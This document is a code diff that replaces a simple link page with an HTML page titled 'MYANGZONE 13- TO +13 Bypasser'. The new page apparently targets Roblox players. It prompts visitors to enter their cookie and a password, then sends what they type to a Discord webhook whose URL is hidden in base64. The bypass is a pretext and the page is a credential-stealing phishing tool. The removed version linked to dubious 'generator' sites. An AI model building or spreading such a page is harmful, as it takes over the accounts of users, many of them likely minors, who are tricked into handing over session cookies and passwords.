@@ -1,204 +1,87 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Untitled</title>
-  
-
-</head>
-<body>
-<!-- partial:index.partial.html -->
-<!DOCTYPE html>
-
-<html lang="en">
-
-<head>
-
-  <meta charset="UTF-8" />
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <title>DARK</title>
-
+  <title>MYANGZONE Bypasser</title>
   <style>
-
-    body, html {
-
-      margin: 0;
-
-      padding: 0;
-
-      overflow: hidden;
-
-      height: 100vh;
-
+    body {
       font-family: Arial, sans-serif;
-
-      color: white;
-
-    }
-
-    canvas {
-
-      position: fixed;
-
-      top: 0;
-
-      left: 0;
-
-      z-index: -1;
-
-    }
-
-    .container {
-
+      background: url('https://cdn.discordapp.com/attachments/1349809697250611238/1349861253287383100/standard_1.gif?ex=6808b701&is=68076581&hm=ccfa5337b25fa32c15ae779c0793864956b4aa58e9d92dc794656790a60a872f') no-repeat center center fixed;
+      background-size: cover;
+      color: #eee;
       display: flex;
-
-      flex-direction: column;
-
-      align-items: center;
-
       justify-content: center;
-
+      align-items: center;
       height: 100vh;
-
-      gap: 20px;
-
-      background: rgba(0, 0, 0, 0.5);
-
+      flex-direction: column;
     }
 
-    h1 {
-
-      font-size: 48px;
-
-      letter-spacing: 2px;
-
+    input, button {
+      padding: 10px;
+      font-size: 16px;
+      margin-top: 10px;
     }
 
-    .btn {
-
-      background-color: #1e1e1e;
-
-      border: 2px solid #fff;
-
-      padding: 15px 30px;
-
-      font-size: 18px;
-
-      color: white;
-
-      text-decoration: none;
-
-      border-radius: 8px;
-
-      transition: all 0.3s;
-
+    input {
+      width: 300px;
     }
 
-    .btn:hover {
-
-      background-color: white;
-
-      color: #1e1e1e;
-
+    button {
+      background-color: #444;
+      color: red;
+      border: none;
+      cursor: pointer;
     }
 
+    button:hover {
+      background-color: #666;
+    }
+
+    .s {
+      margin-top: 30px;
+      text-align: center;
+    }
   </style>
-
 </head>
-
 <body>
 
-  <canvas id="bg"></canvas>
+  <h1>MYANGZONE 13- TO +13 Bypasser</h1>
+  <input type="text" id="a" placeholder="Enter your cookie">
+  <button onclick="z()">Submit</button>
 
-  <div class="container">
-
-    <h1>XXR BEAMS</h1>
-
-    <a href="https://www.roblox.web.pk/generator/XXR%20BEAMS/create" class="btn">Generator</a>
-
-    <a href="https://bloxtools.st/generator/BLOODMOON" class="btn">Autohar</a>
-
-    <a href="https://discord.gg/kqWaATEsjr" class="btn">Join Discord</a>
-
+  <div class="s">
+    <h1>+13 TO -13 Bypasser</h1>
+    <input type="text" id="b" placeholder="Enter your cookie">
+    <input type="text" id="c" placeholder="Enter your cookie">
+    <button onclick="y()">Submit cookie & pass</button>
   </div>
 
   <script>
+    const u = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MjczMzQ2OTU4Mjg4OTA4My9LVm9udVRnSTlNWXRoUG5XRno5bkRKaXFkZ2VxYWFVVzYxdXpRa0JMMmFibmJLb1FmOUV2eVpmT3Z5Y042OHBfNTQ=");
 
-    const canvas = document.getElementById('bg');
-
-    const ctx = canvas.getContext('2d');
-
-    canvas.width = window.innerWidth;
-
-    canvas.height = window.innerHeight;
-
-    let stars = [];
-
-    for (let i = 0; i < 100; i++) {
-
-      stars.push({
-
-        x: Math.random() * canvas.width,
-
-        y: Math.random() * canvas.height,
-
-        radius: Math.random() * 1.5,
-
-        velocity: Math.random() * 0.5 + 0.2
-
-      });
-
+    function x(m) {
+      fetch(u, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: m })
+      })
+      .then(r => alert(r.ok ? "Submitted successfully." : "Failed to send."))
+      .catch(e => alert("Error occurred."));
     }
 
-    function drawStars() {
-
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-      ctx.fillStyle = "white";
-
-      stars.forEach(star => {
-
-        ctx.beginPath();
-
-        ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
-
-        ctx.fill();
-
-        star.y += star.velocity;
-
-        if (star.y > canvas.height) {
-
-          star.y = 0;
-
-          star.x = Math.random() * canvas.width;
-
-        }
-
-      });
-
-      requestAnimationFrame(drawStars);
-
+    function z() {
+      const d = document.getElementById('a').value;
+      if (!d) return alert("Please enter your user.");
+      x("User: " + d);
     }
 
-    drawStars();
-
-    window.addEventListener("resize", () => {
-
-      canvas.width = window.innerWidth;
-
-      canvas.height = window.innerHeight;
-      [Click here](https://DRKGEN.com)
-
-    });
-
+    function y() {
+      const e = document.getElementById('b').value;
+      const f = document.getElementById('c').value;
+      if (!e || !f) return alert("Please enter both user and name.");
+      x(`(Reverse Bypass)\nUser: ${e}\nName: ${f}`);
+    }
   </script>
 
-</body>
-
-</html>
-<!-- partial -->
-  
 </body>
 </html>
